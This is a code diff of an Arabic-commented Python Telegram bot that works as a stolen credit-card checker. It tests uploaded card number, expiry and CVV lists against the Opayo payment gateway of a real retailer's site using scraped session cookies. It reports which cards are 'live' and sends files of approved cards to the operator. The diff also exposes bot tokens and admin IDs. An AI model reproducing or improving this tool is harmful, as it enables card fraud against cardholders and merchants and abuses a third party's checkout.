@@ -18,9 +18,8 @@ import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # ========== الإعدادات ==========
-BOT_TOKEN = "7458997340:AAEKGFvkALm5usoFBvKdbGEs4b2dz5iSwtw"
+BOT_TOKEN = "8334507568:AAHp9fsFTOigfWKGBnpiThKqrDast5y-4cU"
 ADMIN_IDS = [5895491379, 844663875]
-CHANNEL_ID = -1003154179190
 
 # ========== Opayo Settings ==========
 BASE = "https://www.rapidonline.com"
@@ -185,55 +184,57 @@ def get_opayo_cookies():
         print(f"[!] خطأ في استخراج الكوكيز: {e}")
         return None
 
-# ========== 🔥 إرسال النتائج للقناة ==========
-async def send_to_channel(bot_app, card, status_type, message):
-    """إرسال نتيجة مباشرة للقناة"""
+# ========== 🔥 إرسال النتائج في المحادثة ==========
+async def send_result(bot_app, chat_id, card, status_type, message):
+    """إرسال نتيجة مباشرة في نفس المحادثة"""
     try:
         card_number = stats['approved'] + stats['ccn']
         
         if status_type == 'APPROVED':
             text = (
-                "╔═══════════════════╗\n"
+                "╔═══════════════╗\n"
                 "✅ **APPROVED CARD LIVE** ✅\n"
-                "╚═══════════════════╝\n\n"
+                "╚═══════════════╝\n\n"
                 f"💳 `{card}`\n"
                 f"🔥 Status: **CVV LIVE - Approved**\n"
                 f"📊 Card #{card_number}\n"
                 f"⚡️ Opayo Gateway\n"
-                "╚═══════════════════╝"
+                "╚═══════════════╝"
             )
             stats['approved_cards'].append(card)
             
         elif status_type == 'CCN':
             text = (
-                "╔═══════════════════╗\n"
+                "╔═══════════════╗\n"
                 "⚠️ **CCN CARD (3D SECURE)** ⚠️\n"
-                "╚═══════════════════╝\n\n"
+                "╚═══════════════╝\n\n"
                 f"💳 `{card}`\n"
                 f"🔥 Status: **3D Secure Challenge**\n"
                 f"📊 Card #{card_number}\n"
                 f"⚡️ Opayo Gateway\n"
-                "╚═══════════════════╝"
+                "╚═══════════════╝"
             )
             stats['ccn_cards'].append(card)
+        else:
+            return
         
         await bot_app.bot.send_message(
-            chat_id=CHANNEL_ID,
+            chat_id=chat_id,
             text=text,
             parse_mode='Markdown'
         )
     except Exception as e:
-        print(f"[!] خطأ في إرسال رسالة للقناة: {e}")
+        print(f"[!] خطأ في إرسال رسالة: {e}")
 
 # ========== فحص البطاقة ==========
-async def check_card(card, bot_app):
+async def check_card(card, bot_app, chat_id):
     parts = card.strip().split('|')
     if len(parts) != 4:
         stats['errors'] += 1
         stats['error_details']['FORMAT_ERROR'] = stats['error_details'].get('FORMAT_ERROR', 0) + 1
         stats['checking'] -= 1
         stats['last_response'] = 'Format Error'
-        await update_dashboard(bot_app)
+        await update_dashboard(bot_app, chat_id)
         return card, "ERROR", "صيغة خاطئة"
     
     card_number, exp_month, exp_year, cvv = parts
@@ -253,7 +254,7 @@ async def check_card(card, bot_app):
         stats['error_details']['COOKIE_ERROR'] = stats['error_details'].get('COOKIE_ERROR', 0) + 1
         stats['checking'] -= 1
         stats['last_response'] = 'Cookie Error'
-        await update_dashboard(bot_app)
+        await update_dashboard(bot_app, chat_id)
         return card, "ERROR", "فشل في استخراج الكوكيز"
     
     headers_card = {
@@ -307,23 +308,23 @@ async def check_card(card, bot_app):
             stats['approved'] += 1
             stats['checking'] -= 1
             stats['last_response'] = 'Approved ✅'
-            await update_dashboard(bot_app)
-            await send_to_channel(bot_app, card, "APPROVED", message)
+            await update_dashboard(bot_app, chat_id)
+            await send_result(bot_app, chat_id, card, "APPROVED", message)
             return card, "APPROVED", message
             
         elif status == "CCN":
             stats['ccn'] += 1
             stats['checking'] -= 1
             stats['last_response'] = 'CCN ⚠️'
-            await update_dashboard(bot_app)
-            await send_to_channel(bot_app, card, "CCN", message)
+            await update_dashboard(bot_app, chat_id)
+            await send_result(bot_app, chat_id, card, "CCN", message)
             return card, "CCN", message
             
         elif status == "DECLINED":
             stats['declined'] += 1
             stats['checking'] -= 1
             stats['last_response'] = 'Declined ❌'
-            await update_dashboard(bot_app)
+            await update_dashboard(bot_app, chat_id)
             return card, "DECLINED", message
             
         else:
@@ -331,7 +332,7 @@ async def check_card(card, bot_app):
             stats['error_details'][status] = stats['error_details'].get(status, 0) + 1
             stats['checking'] -= 1
             stats['last_response'] = f'{status}'
-            await update_dashboard(bot_app)
+            await update_dashboard(bot_app, chat_id)
             return card, status, message
             
     except Exception as e:
@@ -339,7 +340,7 @@ async def check_card(card, bot_app):
         stats['error_details']['EXCEPTION'] = stats['error_details'].get('EXCEPTION', 0) + 1
         stats['checking'] -= 1
         stats['last_response'] = f'Error: {str(e)[:20]}'
-        await update_dashboard(bot_app)
+        await update_dashboard(bot_app, chat_id)
         return card, "EXCEPTION", str(e)
 
 # ========== Dashboard ==========
@@ -377,12 +378,12 @@ def create_dashboard_keyboard():
     
     return InlineKeyboardMarkup(keyboard)
 
-async def update_dashboard(bot_app):
-    """تحديث Dashboard في القناة"""
+async def update_dashboard(bot_app, chat_id):
+    """تحديث Dashboard"""
     if stats['dashboard_message_id']:
         try:
             await bot_app.bot.edit_message_text(
-                chat_id=CHANNEL_ID,
+                chat_id=chat_id,
                 message_id=stats['dashboard_message_id'],
                 text="📊 **OPAYO CARD CHECKER - LIVE** 📊",
                 reply_markup=create_dashboard_keyboard(),
@@ -392,7 +393,7 @@ async def update_dashboard(bot_app):
             pass
 
 # ========== 🔥 إنشاء الملفات النهائية ==========
-async def send_final_files(bot_app):
+async def send_final_files(bot_app, chat_id):
     """إرسال ملفات txt للبطاقات المقبولة"""
     try:
         if stats['approved_cards']:
@@ -400,7 +401,7 @@ async def send_final_files(bot_app):
             with open("approved_cards.txt", "w") as f:
                 f.write(approved_text)
             await bot_app.bot.send_document(
-                chat_id=CHANNEL_ID,
+                chat_id=chat_id,
                 document=open("approved_cards.txt", "rb"),
                 caption=f"✅ **Approved Cards (CVV LIVE)** ({len(stats['approved_cards'])} cards)",
                 parse_mode='Markdown'
@@ -412,7 +413,7 @@ async def send_final_files(bot_app):
             with open("ccn_cards.txt", "w") as f:
                 f.write(ccn_text)
             await bot_app.bot.send_document(
-                chat_id=CHANNEL_ID,
+                chat_id=chat_id,
                 document=open("ccn_cards.txt", "rb"),
                 caption=f"⚠️ **CCN Cards (3D Secure)** ({len(stats['ccn_cards'])} cards)",
                 parse_mode='Markdown'
@@ -424,31 +425,20 @@ async def send_final_files(bot_app):
 
 # ========== معالجات البوت ==========
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """معالج أمر /start"""
-    user_id = update.effective_user.id
-    print(f"[📥] /start command from user: {user_id}")
-    
-    if user_id not in ADMIN_IDS:
+    if update.effective_user.id not in ADMIN_IDS:
         await update.message.reply_text("❌ غير مصرح - هذا البوت خاص")
         return
     
-    keyboard = [[InlineKeyboardButton("📁 إرسال ملف البطاقات", callback_data="send_file")]]
     await update.message.reply_text(
         "📊 **OPAYO CARD CHECKER BOT**\n\n"
         "أرسل ملف .txt يحتوي على البطاقات\n"
         "الصيغة: `رقم|شهر|سنة|cvv`\n\n"
-        f"📢 القناة: `{CHANNEL_ID}`\n\n"
-        "✅ البوت شغال وجاهز!",
-        reply_markup=InlineKeyboardMarkup(keyboard),
+        "✅ سيتم عرض النتائج هنا مباشرة",
         parse_mode='Markdown'
     )
 
 async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """معالج الملفات"""
-    user_id = update.effective_user.id
-    print(f"[📥] File received from user: {user_id}")
-    
-    if user_id not in ADMIN_IDS:
+    if update.effective_user.id not in ADMIN_IDS:
         await update.message.reply_text("❌ غير مصرح")
         return
     
@@ -478,9 +468,8 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         'chat_id': update.effective_chat.id
     })
     
-    dashboard_msg = await context.application.bot.send_message(
-        chat_id=CHANNEL_ID,
-        text="📊 **OPAYO CARD CHECKER - LIVE** 📊",
+    dashboard_msg = await update.message.reply_text(
+        "📊 **OPAYO CARD CHECKER - LIVE** 📊",
         reply_markup=create_dashboard_keyboard(),
         parse_mode='Markdown'
     )
@@ -489,19 +478,19 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         f"✅ تم بدء الفحص!\n\n"
         f"📊 إجمالي البطاقات: {len(cards)}\n"
-        f"📢 تابع النتائج في القناة",
+        f"📢 تابع النتائج أدناه",
         parse_mode='Markdown'
     )
     
     def run_checker():
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
-        loop.run_until_complete(process_cards(cards, context.application))
+        loop.run_until_complete(process_cards(cards, context.application, update.effective_chat.id))
         loop.close()
     
     threading.Thread(target=run_checker, daemon=True).start()
 
-async def process_cards(cards, bot_app):
+async def process_cards(cards, bot_app, chat_id):
     """معالجة البطاقات"""
     for i, card in enumerate(cards):
         if not stats['is_running']:
@@ -510,13 +499,13 @@ async def process_cards(cards, bot_app):
         stats['checking'] = 1
         parts = card.split('|')
         stats['current_card'] = f"{parts[0][:6]}****{parts[0][-4:]}" if len(parts) > 0 else card[:10]
-        await update_dashboard(bot_app)
+        await update_dashboard(bot_app, chat_id)
         
-        await check_card(card, bot_app)
+        await check_card(card, bot_app, chat_id)
         stats['cards_checked'] += 1
         
         if stats['cards_checked'] % 5 == 0:
-            await update_dashboard(bot_app)
+            await update_dashboard(bot_app, chat_id)
         
         await asyncio.sleep(2)
     
@@ -524,7 +513,7 @@ async def process_cards(cards, bot_app):
     stats['checking'] = 0
     stats['current_card'] = ''
     stats['last_response'] = 'Completed ✅'
-    await update_dashboard(bot_app)
+    await update_dashboard(bot_app, chat_id)
     
     summary_text = (
         "═══════════════════\n"
@@ -540,12 +529,12 @@ async def process_cards(cards, bot_app):
     )
     
     await bot_app.bot.send_message(
-        chat_id=CHANNEL_ID,
+        chat_id=chat_id,
         text=summary_text,
         parse_mode='Markdown'
     )
     
-    await send_final_files(bot_app)
+    await send_final_files(bot_app, chat_id)
     
     final_text = (
         "╔═══════════════════╗\n"
@@ -557,34 +546,20 @@ async def process_cards(cards, bot_app):
     )
     
     await bot_app.bot.send_message(
-        chat_id=CHANNEL_ID,
+        chat_id=chat_id,
         text=final_text,
         parse_mode='Markdown'
     )
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """معالج الرسائل النصية"""
-    user_id = update.effective_user.id
-    print(f"[📥] Message from user: {user_id}")
-    
-    if user_id not in ADMIN_IDS:
+    if update.effective_user.id not in ADMIN_IDS:
         await update.message.reply_text("❌ غير مصرح - هذا البوت خاص")
         return
-    
-    await update.message.reply_text(
-        "👋 مرحباً!\n\n"
-        "استخدم /start لبدء البوت\n"
-        "أو أرسل ملف .txt مباشرة"
-    )
 
 async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """معالج الأزرار"""
     query = update.callback_query
-    user_id = query.from_user.id
     
-    print(f"[📥] Button callback from user: {user_id}, data: {query.data}")
-    
-    if user_id not in ADMIN_IDS:
+    if query.from_user.id not in ADMIN_IDS:
         await query.answer("❌ غير مصرح", show_alert=True)
         return
     
@@ -592,39 +567,21 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     if query.data == "stop_check":
         stats['is_running'] = False
-        await update_dashboard(context.application)
+        await update_dashboard(context.application, query.message.chat_id)
         await query.message.reply_text("🛑 تم إيقاف الفحص!")
-    elif query.data == "send_file":
-        await query.message.reply_text(
-            "📁 أرسل ملف .txt يحتوي على البطاقات\n"
-            "الصيغة: `رقم|شهر|سنة|cvv`",
-            parse_mode='Markdown'
-        )
 
 def main():
-    """الدالة الرئيسية"""
-    print("=" * 50)
     print("[🤖] Starting Opayo Telegram Bot...")
-    print(f"[📢] Channel ID: {CHANNEL_ID}")
-    print(f"[👤] Admin IDs: {ADMIN_IDS}")
-    print("=" * 50)
     
-    # إنشاء التطبيق
     app = Application.builder().token(BOT_TOKEN).build()
     
-    # إضافة المعالجات
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
     app.add_handler(CallbackQueryHandler(button_callback))
     
-    print("[✅] Bot handlers registered successfully!")
-    print("[🔄] Starting polling...")
-    
-    # بدء البوت
-    app.run_polling(
-        allowed_updates=Update.ALL_TYPES,
-        drop_pending_updates=True
-    )
+    print("[✅] Bot is running...")
+    app.run_polling()
 
-if
+if __name__ == "__main__":
+    main()
